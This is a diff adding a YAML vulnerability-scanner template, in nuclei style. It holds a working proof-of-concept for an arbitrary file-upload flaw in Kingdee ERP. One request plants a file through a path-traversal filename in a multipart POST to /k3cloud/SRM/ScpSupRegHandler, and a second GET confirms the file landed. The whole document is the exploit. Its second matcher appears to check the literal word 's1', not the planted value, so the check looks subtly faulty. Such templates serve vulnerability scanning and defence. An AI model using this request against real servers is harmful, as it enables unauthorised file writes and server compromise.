@@ -1,0 +1,42 @@
+id: yaml-poc-kingdee-erp-file_upload-CT-949212
+info:
+  name: Yaml Poc Kingdee Erp File_Upload Ct 949212
+  author: ct-user
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-kingdee-erp-file_upload-CT-949212'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /k3cloud/SRM/ScpSupRegHandler
+  body: "--{{rboundary}}\r\nContent-Disposition: form-data; name=\"dbId_v\"\r\n\r\n\
+    .\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"FID\"\r\n\r\n2022\r\
+    \n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"FAtt\"; filename=\"\
+    ../../../../uploadfiles/{{s2}}.txt\"\r\nContent-Type: text/plain\r\n\r\n{{s1}}\r\
+    \n\r\n--{{rboundary}}--"
+  headers:
+    Content-Type: multipart/form-data; boundary={{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 'true'
+- method: GET
+  path:
+  - /k3cloud/uploadfiles/{{s2}}.txt
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - s1
